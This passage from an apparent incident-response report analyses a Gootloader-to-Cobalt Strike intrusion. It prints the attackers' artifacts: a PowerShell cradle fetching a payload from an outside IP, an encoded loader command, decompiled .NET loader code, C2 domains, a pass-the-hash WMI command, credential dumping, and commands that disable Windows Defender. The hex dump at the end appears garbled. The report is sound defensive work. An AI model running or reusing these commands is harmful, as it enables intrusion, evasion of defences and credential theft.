Workstations\n  - Remote Service Execution\n  - \\\\WORKSTATION\\ADMIN$\\abb6ca2.exe\n  \n  21:34 UTC RDP into Domain Controller from Beachhead\n  - Restricted Admin Mode enabled via remote WMI prior to RDP connection\n  - Invoke-WMIMExec -Target DomainController -Domain domain.local -Username USER -Hash \"...\" -Command \"powershell.exe reg add \"hklm\\system\\currentcontrolset\\control\\lsa\" /v DisableRestrictedAdmin /t REG_DWORD /d 0\" -verbose\n  - Microsoft Defender Scheduled Tasks Deleted\n  - Cobalt Strike Powershell payload executed through Powershell via RDP session\n  - LaZagne dropped and executed: ls.exe all -oN --output C:\\Users\n  \n  21:49 UTC RDP into File Share Server from Beachhead\n  - Restricted Admin Mode enabled via remote WMI prior to RDP connection\n  - Microsoft Defender Scheduled Tasks Deleted\n  - Cobalt Strike Powershell payload executed through Powershell via RDP session\n  \n  21:53 UTC Documents accessed on File Share Server interactively using Wordpad.exe\n  - C:\\Program Files\\Windows NT\\Accessories\\WORDPAD.EXE \"C:\\shares\\STAFFFILE.docx\"\n  \n  Day 2\n  \n  07:36 UTC Advanced IP Scanner used to port scan network from Domain Controller\n  - C:\\Users\\USER\\AppData\\Local\\Temp\\\\\\Advanced IP Scanner 2\\advanced_ip_scanner.exe\n  - Ports: 21,80,135,443,445,3389,8080,56133,58000,58157,58492,58682,60234,60464,64502\n  \n  07:45 UTC File Server SMB Shares accessed from Domain Controller\n  \n  7:54 UTC RDP Connection to Backup Server\n```\n\nAnalysis and reporting completed by @kostastsale, @iiamaleks, @pigerlin.\n\n## Initial Access\n\nThe threat actor gained initial access using Gootloader malware. Here’s a video of the user searching and downloading the malware via the poisoned SEO search.\n\n[GootLoader Download](https://www.youtube.com/embed/IdR-tlv7w48?feature=oembed)\n\nThe Javascript file is then executed when double-clicked after the zip is opened.\n\n```image\nAlt: Execution\nDescription: The image depicts a screenshot of a software interface displaying a Windows Registry Editor. On the left side, there are various folders under the path 'HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username', which include 'Phone', 'ShellUI', 'Pim', 'Poom', 'Remote Assistance', 'ScreenMagnifier', 'Sensors', and 'SkyDrive'. The right side shows a table with registry entries labeled '(default)' and indexed rows (0 to 7), containing values that appear to be obfuscated strings. This information is relevant to the analysis of the execution of Gootloader malware, suggesting a technical aspect of the malware's operation.\n```\n\n## Execution\n\nGootloader upon execution creates two registry keys:\n\n```\nHKCU:\\SOFTWARE\\Microsoft\\Phone\\Username\nHKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0\n```\n\nThe first is populated with an encoded Cobalt Strike payload and the latter is used to store a .NET loader named `powershell.dll`.\n\n```image\nAlt: Registry Keys\nDescription: The image displays a screenshot of a Windows Registry Editor, showing the registry path 'HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0'. It contains a list of registry values with associated data types and values. The left pane shows the key hierarchy, specifically the 'Phone' key and its subkeys, while the right pane details the values stored in 'Username0', indicating the presence of encoded data related to the Gootloader malware. This is relevant for understanding the malware's execution and persistence mechanisms.\nTranscription: |\n  Key name\n  HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0\n  \n  Value Name    Value Type    Data\n  (default)     RegSz         \n  0             RegSz         4d5a90000300000004000000ffff0000b8000...\n  1             RegSz         65a6a586d280700002b0d0012037b1b0004a...\n  2             RegSz         00006e282900000a00120209281e00000a7d...\n  3             RegSz         7f01140003004c250000000000086008b011...\n  4             RegSz         64e616d654f7264696e616c730048696e740...\n  5             RegSz         e33320526567697374727920790052656773...\n  6             RegSz         000000000000000000000000000000000000...\n```\n\nFollowing the Registry events, a PowerShell command was launched executing an encoded command.\n\n```image\nAlt: PowerShell Command\nDescription: The image displays a table summarizing key event details related to a cybersecurity incident. It includes columns for 'EventCode', 'TaskCategory', 'ParentCommandLine', and 'CommandLine'. The 'Process Create' event shows the execution of 'C:\\Windows\\System32\\WScript.exe' and a PowerShell command executing a potentially encoded payload from a specified file path.\nTranscription: |\n  plaintext\n  EventCode   TaskCategory       ParentCommandLine                                                                                                          CommandLine\n  1           Process Create     \"C:\\Windows\\System32\\WScript.exe\"                                                                                          \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" /c C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe \"/e\"\n              (rule:             \"C:\\Users\\[REDACTED]\\AppData\\Local\\Temp\\Temp1_olympus plea agreement(46196).zip\\olympus_plea_agreement 34603.js\"            NgAxA\"DQANgA0ADkA\"MgAxADEA0WB\"zAGwAZQBlAHAAIAAtAHMAIAAA4AD\"MA\"OwAkAG8AcABqAD0ARwBlAH\"QA\"LQB5AHQ\"AZQBtAFAA\"cg\"B\"vAHAaZQ\"ByA\"HQAeQ\"Ag\"AC0\"AcABh\"AH\"QAaA\n              ProcessCreate)\n```\n\n```\n\"powershell.exe\" /c C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe \"/\"e\" NgAxA\"DQANgA0ADkA\"MgAxADEAOwB\"zAGwAZQBlAHAAIAAtAHMAIAA4AD\"MA\"OwAkAG8AcABqAD0ARwBlAH\"...\n```\n\nThe PowerShell command will extract the .NET loader from `HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0` and execute the code in memory via `Assembly.Load()`.\n\nThis CyberChef recipe can be used to decode the related PS encoded payload.\n\nOnce the PowerShell script is finished running, the next stage involves the .NET loader. The .NET loader will read `HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username` and extract the encoded Cobalt Strike payload. This payload will be decoded and subsequently loaded into memory for execution.\n\nA simple encoding scheme is used where a letter will correspond to one of the hex characters (0-F), or alternately three zeros.\n\n```\nq->000\nv->0\nw->1\nr->2\nt->3\ny->4\nu->5\ni->6\no->7\np->8\ns->9\nq->A\nh->B\nj->C\nk->D\nl->E\nz->F\n```\n\n```image\nAlt: .NET Loader\nDescription: The image depicts a code snippet written in C#. It outlines a method for reading encoded data from the Windows registry, decoding it, and loading it into memory for execution. The code includes comments and structured sections labeled as '1. Read encoded data from registry,' '2. Decode data,' and '3. Load into memory and run.' The use of specific classes like `RegistryKey` and `Open.DynamicDllLoader` indicates a focus on manipulating system resources, typical in the context of cyber threat intelligence.\nTranscription: |\n  csharp\n  // Token: 0x60000002 RID: 2 RVA: 0x00002104 File Offset: 0x00000304\n  public static string Test()\n  {\n      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(\"SOFTWARE\\\\Microsoft\\\\Phone\\\\\" +\n          Environment.UserName);\n      if (registryKey != null)\n      {\n          string text = \"\";\n          for (int i = 0; i < 99999; i++)\n          {\n              string text2 = \"\";\n              try\n              {\n                  text2 = registryKey.GetValue(i.ToString()).ToString();\n              }\n              catch\n              {\n              }\n              if (text2.Length == 0)\n              {\n                  break;\n              }\n              text += text2;\n          }\n          registryKey.Close();\n          \n          // 2. Decode data\n          text = text.Replace(\"q\", \"0\").Replace(\"v\", \"0\").Replace(\"w\", \"1\").Replace(\"r\", \"2\").Replace(\"t\", \"3\").Replace(\"y\", \"4\").Replace(\"u\", \"5\").Replace(\"i\", \"6\").Replace(\"o\", \"7\").Replace(\"p\", \"8\").Replace(\"s\", \"9\").Replace(\"g\", \"A\").Replace(\"h\", \"B\").Replace(\"j\", \"C\").Replace(\"k\", \"D\").Replace(\"l\", \"E\").Replace(\"z\", \"F\");\n          byte[] data = Open.STBA(text);\n          Open.DynamicDllLoader dynamicDllLoader = new Open.DynamicDllLoader();\n          bool flag = dynamicDllLoader.LoadLibrary(data);\n          Console.WriteLine(\"Loaded: \" + flag);\n          if (flag)\n          {\n              uint procAddress = dynamicDllLoader.GetProcAddress(\"mono_trace\");\n              Console.WriteLine(\"Handle: \" + procAddress);\n          }\n      }\n      Console.ReadKey();\n      return \"Install\";\n  }\n```\n\nThe below diagram summarizes the Gootloader initial execution.\n\n```image\nAlt: Execution Summary\nDescription: The image is a flowchart illustrating the execution process of the Gootloader. It outlines the steps involved, starting from the initial execution of the malicious script (`wscript.exe olympus_plea_agreement 34603.js`), which contacts the command and control (C2) servers to retrieve the payload. It details how the Gootloader writes a .NET loader and an encoded Cobalt Strike payload to the registry, and how the PowerShell command is executed to load the .NET loader. The diagram also highlights how the .NET loader subsequently reads and decodes the Cobalt Strike payload from the registry for execution.\nTranscription: |\n  plaintext\n  https://junk-bros.com\n  https://jp.imonitorsoft.com\n  https://kakiosk.adsparkdev.com\n  \n  wscript.exe olympus_plea_agreement 34603.js\n      Gootloader contacts C2 and pulls down payload\n  \n  powershell.exe\n      .NET loader read from registry and loaded in Powershell via Assembly.Load() using an encoded Powershell command\n      The same encoded Powershell command is added as a scheduled task to run on user logon\n  \n  .NET loader and encoded Cobalt Strike payload written to registry\n      .NET Loader -> HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0\n      Cobalt Strike -> HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username\n  \n  .NET Loader\n      .NET loader is executed which reads and decodes a Cobalt Strike payload from the registry\n      .NET loader loads and executes the Cobalt Strike payload\n```\n\nAn excellent resource from Microsoft describes a set of configurations that can be applied to Windows that can stop `.js` files from executing, preventing this attack chain from ever getting off the ground.\n\nDuring later stages of the intrusion, Cobalt Strike was executed interactively through RDP on multiple systems.\n\n```\npowershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('hxxp://37.120.198.225:80/trio'))\"\n```\n\n## Persistence\n\nThe Javascript (Gootloader) file invoked an encoded PowerShell command.\n\n```image\nAlt: PowerShell Command\nDescription: The image displays a log entry or data table showing details of a process creation event related to a PowerShell command. It includes columns for EventCode, TaskCategory, ParentImage, and CommandLine. The CommandLine specifies a PowerShell script execution through the Windows Script Host (wscript.exe), indicating the use of encoded commands. This image provides technical insight into the execution of potentially malicious PowerShell commands, relevant for understanding cyber threats.\nTranscription: |\n  plaintext\n  EventCode: 1\n  TaskCategory: Process Create (rule: ProcessCreate)\n  ParentImage: C:\\Windows\\System32\\wscript.exe\n  CommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" /c C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe \"/e\" N\"g\"A4\"ADc\"ANgA4\"ADEAMwA7ACQAYQ\"A9ACIA\"TgB\"n\"AEEAeAB\"B\"AE\"Q\"AUQ\"BBAE\"4ZwBBADA\"AQ\"QBEAGsAQQ\"BNAGc\"AQDBA4\"EEARABF\"AE\"E\"AT\"w\"B3A\"ETIAegBB\"AEc\"AdvBBA\"F\"oAUQBC\"AGwA\"Q\"Q\"B\"IAEEAQ\"\n```\n\nThe encoded PowerShell command creates a Scheduled Task that executes when the selected user logs on to the computer. An encoded PowerShell command is executed that will retrieve and execute the payload stored in the Registry.\n\n```\n6876813;\n$a=\"NgAxADQANgA0ADkAMgAxADEAOwBzAGwAZQBlAHAAIAAtAHMAIAA4ADMAOwAkAG8AcABqAD0ARwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AcABhAHQAaAAgACgAIgBoAGsAIgArACIAYwB1ADoAXABzAG8AZgAiACsAIgB0AHcAIgArACIAYQByAGUAXABtAGkAYwAiACsAIgByAG8AcwAiACsAIgBvAGYAdABcAFAAaABvAG4AZQBcACIAKwBbAEUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgAoACIAdQBzAGUAIgArACIAcgBuACIAKwAiAGEAbQBlACIAKQArACIAMAAiACkAOwBmAG8AcgAgACgAJAB1AG8APQAwADsAJAB1AG8AIAAtAGwAZQAgADcANgAwADsAJAB1AG8AKwArACkAewBUAHIAeQB7ACQAbQBwAGQAKwA9ACQAbwBwAGoALgAkAHUAbwB9AEMAYQB0AGMAaAB7AH0AfQA7ACQAdQBvAD0AMAA7AHcAaABpAGwAZQAoACQAdAByAHUAZQApAHsAJAB1AG8AKwArADsAJABrAG8APQBbAG0AYQB0AGgAXQA6ADoAKAAiAHMAcQAiACsAIgByAHQAIgApACgAJAB1AG8AKQA7AGkAZgAoACQAawBvACAALQBlAHEAIAAxADAAMAAwACkAewBiAHIAZQBhAGsAfQB9ACQAeQBsAD0AJABtAHAAZAAuAHIAZQBwAGwAYQBjAGUAKAAiACMAIgAsACQAawBvACkAOwAkAGsAagBiAD0AWwBiAHkAdABlAFsAXQBdADoAOgAoACIAbgBlACIAKwAiAHcAIgApACgAJAB5AGwALgBMAGUAbgBnAHQAaAAvADIAKQA7AGYAbwByACgAJAB1AG8APQAwADsAJAB1AG8AIAAtAGwAdAAgACQAeQBsAC4ATABlAG4AZwB0AGgAOwAkAHUAbwArAD0AMgApAHsAJABrAGoAYgBbACQAdQBvAC8AMgBdAD0AWwBjAG8AbgB2AGUAcgB0AF0AOgA6ACgAIgBUAG8AQgAiACsAIgB5AHQAZQAiACkAKAAkAHkAbAAuAFMAdQBiAHMAdAByAGkAbgBnACgAJAB1AG8ALAAyACkALAAoADIAKgA4ACkAKQB9AFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvACIAKwAiAGEAZAAiACkAKAAkAGsAagBiACkAOwBbAE8AcABlAG4AXQA6ADoAKAAiAFQAZQAiACsAIgBzAHQAIgApACgAKQA7ADYAMQAxADgAOQA4ADUANAA0ADsA\";\n```\n\nThe task created from the PowerShell script:\n\n```image\nAlt: Scheduled Task\nDescription: The image displays an XML representation of a scheduled task created by a PowerShell script. The task is set to trigger when a specific user logs on. Key elements include the task's registration information, triggers, settings, actions, and user principal details. The XML schema indicates various properties such as logon type, execution parameters, and security context, which are relevant to the execution of the PowerShell command.\nTranscription: |\n  xml\n  <?xml version=\"1.0\" encoding=\"UTF-16\"?>\n  <Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n    <RegistrationInfo>\n      <URI>\\</URI>\n    </RegistrationInfo>\n    <Triggers>\n      <LogonTrigger>\n        <Enabled>true</Enabled>\n        <UserId></UserId>\n      </LogonTrigger>\n    </Triggers>\n    <Settings>\n      <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n      <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>\n      <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>\n      <AllowHardTerminate>true</AllowHardTerminate>\n      <StartWhenAvailable>false</StartWhenAvailable>\n      <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n      <IdleSettings>\n        <Duration>PT10M</Duration>\n        <WaitTimeout>PT1H</WaitTimeout>\n        <StopOnIdleEnd>true</StopOnIdleEnd>\n        <RestartOnIdle>false</RestartOnIdle>\n      </IdleSettings>\n      <AllowStartOnDemand>true</AllowStartOnDemand>\n      <Enabled>true</Enabled>\n      <Hidden>false</Hidden>\n      <RunOnlyIfIdle>false</RunOnlyIfIdle>\n      <WakeToRun>false</WakeToRun>\n      <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>\n      <Priority>7</Priority>\n    </Settings>\n    <Actions Context=\"Author\">\n      <Exec>\n        <Command>C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe</Command>\n        <Arguments>-w -n -e \n```\n\n## Defense Evasion\n\nWindows Defender scheduled scans were deleted from the system. This was observed on multiple servers the threat actor pivoted to.\n\n```image\nAlt: Windows Defender\nDescription: The image displays a textual output from a process creation log, detailing the execution of the 'schtasks.exe' command. This command was used to delete scheduled tasks related to Windows Defender, indicating a potential evasion of security measures. Key elements include the process ID, command line executed, user information, and hash values for verification. The context suggests this is part of a larger discussion on defense evasion tactics employed by threat actors.\nTranscription: |\n  plaintext\n  \"Process Create:\n  RuleName: technique_id=T1086,technique_name=PowerShell\n  UtcTime:\n  ProcessGuid: {c26db5f6-5adc-61f9-f631-000000000060}\n  ProcessId:  3688\n  Image: C:\\Windows\\System32\\schtasks.exe\n  FileVersion:\n  Description: Task Scheduler Configuration Tool\n  Product: Microsoft Windows Operating System\n  Company: Microsoft Corporation\n  OriginalFileName: schtasks.exe\n  CommandLine: \"C:\\Windows\\system32\\schtasks.exe\" /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f\n  CurrentDirectory: C:\\Users\\\n  User:\n  LogonGuid: {c26db5f6-901c-61a3-bdad-030000000000}\n  LogonId: 0x3ABD8\n  TerminalSessionId: 1\n  IntegrityLevel: High\n  Hashes: SHA1=EF173058B6BD8AB7E07C1A56B63A9E504E463D2DA,MD5=8AC868920214321438EABFBDE93BC2,SHA256=1AC5741B075111E49CB1681BD3A00EEF9B03F\n  ParentProcessGuid: {c26db5f6-5aa1-61f9-e731-000000000060}\n  ParentProcessId: 9724\n  ParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  ParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \"\n```\n\n```\nschtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f\nschtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /f\nschtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /f\nschtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /f\n```\n\nFurthermore, PowerShell was used to disable multiple security features built into Microsoft Defender.\n\n```\nSet-MpPreference -DisableRealtimeMonitoring $true\nSet-MpPreference -DisableArchiveScanning $true\nSet-MpPreference -DisableBehaviorMonitoring $true\nSet-MpPreference -DisableIOAVProtection $true\nSet-MpPreference -DisableIntrusionPreventionSystem $true\nSet-MpPreference -DisableScanningNetworkFiles $true\nSet-MpPreference -MAPSReporting 0\nSet-MpPreference -DisableCatchupFullScan $True\nSet-MpPreference -DisableCatchupQuickScan $True\n```\n\nAs in many cases involving Cobalt Strike, we observed rundll32 used to load the Cobalt Strike beacons into memory on the beachhead host.\n\n```image\nAlt: Memory Dump\nDescription: The image displays a table containing three rows and three columns. The columns are labeled 'Action Type', 'Initiating Process File Name', and 'Initiating Process Command Line'. Each row corresponds to actions involving the process 'rundll32.exe', detailing the type of action (such as 'RemoteSetThreadContextMemoryExecution' and 'RemoteExecutable MemoryAllocation') performed by or related to this process. This data is relevant to understanding the behavior of the threat actor's tools during a cyber intrusion.\nTranscription: |\n  Action Type                                      Initiating Process File Name    Initiating Process Command Line\n  RemoteSetThreadContextMemoryExecution            rundll32.exe                    rundll32.exe\n  RemoteExecutableMemoryAllocation                 rundll32.exe                    rundll32.exe\n  RemoteExecutableMemoryAllocation                 rundll32.exe                    rundll32.exe\n```\n\nThis can be observed in the memory dump from the beachhead host with the tell-tale `PAGE_EXECUTE_READWRITE` protection settings on the memory space and MZ headers observable in the process memory space.\n\n```image\nAlt: Memory Dump\nDescription: The image is a screenshot of a memory dump, showing hexadecimal machine code and memory addresses related to the execution of `rundll32.exe`. Key elements include indications of `PAGE_EXECUTE_READWRITE` memory protection settings and `MZ` headers, which are characteristic of executable files. The layout consists of lines of code displaying function calls and memory operations, with specific highlights on the memory protection status and executable identifiers.\nTranscription: |\n  08 4a 40 d1 c7 7e 7f 00 00  J...@..~...\n  3420    rundll32.exe          0x3030000    0x3063fff    VadS    PAGE_EXECUTE_READWRITE    52    1    Disabled\n  ...\n  50 52 55 56 57 8b ec 83 ec 0c  MZRE.\n  c3 5a 52 5e 68 00 00 00 00 68  .Z^h....h\n  c3 5a 5f 5d 0f 45 68 00 00 00  .Z_]..Eh...\n  ...\n  0x3030002:    dec    ebp\n  0x3030003:    pop    ecx\n  0x3030004:    push   ebp\n  0x3030005:    inc    ebp\n  0x3030006:    push   0x303009\n  0x303000b:    pop    ebx\n  0x303000c:    add    ebx, ebx\n  0x303000e:    mov    esp, esp\n  0x3030010:    mov    ebp, esp\n  0x3030012:    push   0x7d445\n  0x3030017:    call   0x56a2b5f0\n  ...\n  0x3030021:    push   edi\n  0x3030022:    call   eax\n  0x3030024:    add    byte ptr [eax], al\n  0x3030026:    add    byte ptr [eax], al\n  0x3030028:    add    byte ptr [eax], al\n  0x303002a:    add    byte ptr [eax], al\n  0x303002c:    add    byte ptr [eax], al\n  0x303002e:    add    byte ptr [eax], al\n  0x3030030:    add    byte ptr [eax], al\n  0x3030032:    add    byte ptr [eax], al\n  0x3030034:    add    byte ptr [eax], al\n  0x3030036:    add    byte ptr [eax], al\n  0x3030038:    add    byte ptr [eax], al\n  3420    rundll32.exe          0x3260000    0x329dfff    VadS    PAGE_EXECUTE_READWRITE    62    1    Disabled\n  ...\n  50 52 55 56 57 8b ec 83 ec 0c  MZRE.\n  c3 5a 52 5e 68 00 00 00 00 68  .Z^h....h\n  c3 5a 5f 5d 0f 45 68 00 00 00  .Z_]..Eh...\n  ...\n  0x3260001:    pop    edx\n  0x3260002:    dec    ebp\n  0x3260003:    pop    ecx\n  0x3260004:    push   ebp\n  0x3260005:    inc    ebp\n  0x3260006:    push   0x3260009\n  0x326000b:    pop    ebx\n  0x326000c:    add    ebx, ebx\n  0x326000e:    mov    esp, esp\n  0x3260010:    mov    ebp, esp\n  0x3260012:    push   0x7d445\n  0x3260017:    call   0x56a2b5f0\n  ...\n  0x3260021:    push   edi\n  0x3260022:    call   eax\n  0x3260024:    add    byte ptr [eax], al\n  0x3260026:    add    byte ptr [eax], al\n  0x3260028:    add    byte ptr [eax], al\n  0x326002a:    add    byte ptr [eax], al\n  0x326002c:    add    byte ptr [eax], al\n  0x326002e:    add    byte ptr [eax], al\n  0x3260030:    add    byte ptr [eax], al\n  0x3260032:    add    byte ptr [eax], al\n  0x3260034:    add    byte ptr [eax], al\n  0x3260036:    add    byte ptr [eax], al\n  0x3260038:    add    byte ptr [eax], al\n  7132    rundll32.exe          0xa700000    0xa90fff    VadS    PAGE_EXECUTE_READWRITE    33    1    Disabled\n  ...\n  4d 5a 90 00 03 00 00 00 04 00  MZARUH.\n  bd 1f 4c ef 20 00 00 00 00 00  ..L. ....\n  ...\n  a8 81 c1 f2 00 00 00 00 00 00  ..........\n  ...\n  03 5a 6f f1 01 48 00 00 00 00  .Zo..H....\n  ...\n  5a ff d3 00 00 00 00 00 00 00  Z.........\n  0xa700000:    pop    r10\n```\n\nDuring the intrusion, we observed various named pipes utilized by the threat actor’s Cobalt Strike beacons including default Cobalt Strike named pipes.\n\n```\nPipeName: \\msagent_ld\nPipeName: \\1ea887\n```\n\nThe threat actors were observed making use of double encoded Powershell commands. The first layer of encoding contains Hexadecimal and XOR encoding.\n\n```image\nAlt: Encoded Powershell\nDescription: The image displays a detailed output from a PowerShell process creation event. It includes various technical attributes such as the Process GUID, Process ID, image path, file version, description, and command line used. The command line contains obfuscated code involving hexadecimal values, indicating potential malicious intent. Additionally, it lists user information, terminal session ID, integrity level, and hash values related to the process, showcasing the technical details of the executed PowerShell command.\nTranscription: |\n  plaintext\n  \"Process Create:\n  RuleName: technique_id=T1086,technique_name=PowerShell\n  UtcTime: \n  ProcessGuid: {bb28eb5f-a41e-61f9-8445-000000000508}\n  ProcessId: 6268\n  Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  FileVersion: \n  Description: Windows PowerShell\n  Product: Microsoft Windows® Operating System\n  Company: Microsoft Corporation\n  OriginalFileName: PowerShell.EXE\n  CommandLine: powershell -nop -non -ep bypass -w h -c \"&([scriptblock]::Create(([0x34,0x73,0x2d,0x5e,0x75,0x67,0x3d,0x5f,0x72,0x7a,0x75,0x6d,0x64,0x30,0x53,0x7f,0x7d,0x7c,0x3e,0x43,0x75,0x62,0x66,0x75,0x6f,0x2c,0x8d,0x7c,0x58,0x64,0x64,0x6e,0x75,0x6e,0x38,0x37,0x55,0x44,0x3c,0x37,0x8c,0x37,0x68,0x74,0x68,0x6e,0x43,0x75,0x6f,0x75,0x6d,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0